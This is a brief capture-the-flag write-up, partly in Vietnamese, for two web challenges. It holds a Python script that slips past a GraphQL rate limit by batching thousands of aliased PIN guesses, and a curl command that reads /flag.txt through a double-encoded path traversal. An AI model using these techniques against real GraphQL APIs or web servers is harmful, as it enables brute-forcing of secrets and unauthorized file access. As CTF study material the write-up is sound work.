# force
Bypass graphql rate limit (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#bypassing-rate-limits-using-aliases-in-graphql)
```py
import requests
import re

URL = 'https://web-force-force-5aa82fa33d9da165.be.ax/'

add = 10**5 // 10
l = 0
for i in range(10):
    r = l + add
    t = "query hehe\n{\n"

    for j in range(l, r + 1):
        t += f"  a{j}: flag(pin: {j})\n"
    t += "}"

    headers = {
        'Content-Type': 'text/plain;charset=UTF-8'
    }
    resp = requests.post(URL, data=t.encode(), headers=headers).text

    print(re.findall('cor.*\}', resp))

    l += add
```

# msfrognymize
Dùng (https://book.hacktricks.xyz/pentesting-web/file-inclusion#python-root-element) để bypass => path traversal.
```bash
curl --path-as-is https://msfrognymize.be.ax/anonymized/%252Fflag.txt
```
